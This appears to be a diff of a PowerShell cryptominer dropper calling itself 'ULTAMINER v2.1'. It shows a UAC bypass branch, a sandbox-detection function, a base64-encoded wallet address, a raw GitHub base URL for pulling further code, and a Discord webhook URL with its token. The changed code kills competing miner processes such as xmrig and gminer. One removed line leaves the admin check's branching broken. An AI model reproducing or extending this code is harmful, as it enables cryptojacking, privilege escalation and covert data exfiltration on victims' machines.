@@ -23,9 +23,9 @@ if (-not $isAdmin) {
     } catch {
         Write-Host "[!] UAC Bypass failed. Proceeding with standard privileges."
     }
-} else {
     Write-Host "[+] Running as High Integrity Administrator."
 }
+Write-Host "[*] ULTAMINER v2.1 Audit Mode Active"
 
 
 function Test-Sandbox {
@@ -69,14 +69,16 @@ $c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ4M0cxQ
 $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
 $c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"
 
-# === PROCESS CLEANUP (kill old instances) ===
-$current = $PID
 try {
-    Get-Process -Name 'powershell','pwsh' -EA 0 | Where-Object { $_.Id -ne $current } | ForEach-Object {
+    Write-Host "[*] Evicting stale instances..."
+    Get-Process -Name 'powershell','pwsh','xmrig','miner','gminer' -EA 0 | ForEach-Object {
         try {
             $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -EA 0).CommandLine
-            if ($cmd -like '*update.ps1*' -or $cmd -like '*UpdateCoord*' -or $cmd -like '*test-repo*') {
-                $_ | Stop-Process -Force -EA 0
+            if ($cmd -match 'deploy\.ps1|Bridge|UpdateCoord|test-repo|xmrig|gminer') {
+                if ($_.Id -ne $current) {
+                    Write-Host "[*] Killing stale process: $($_.ProcessName) ($($_.Id))"
+                    $_ | Stop-Process -Force -EA 0
+                }
             }
         } catch {}
     }
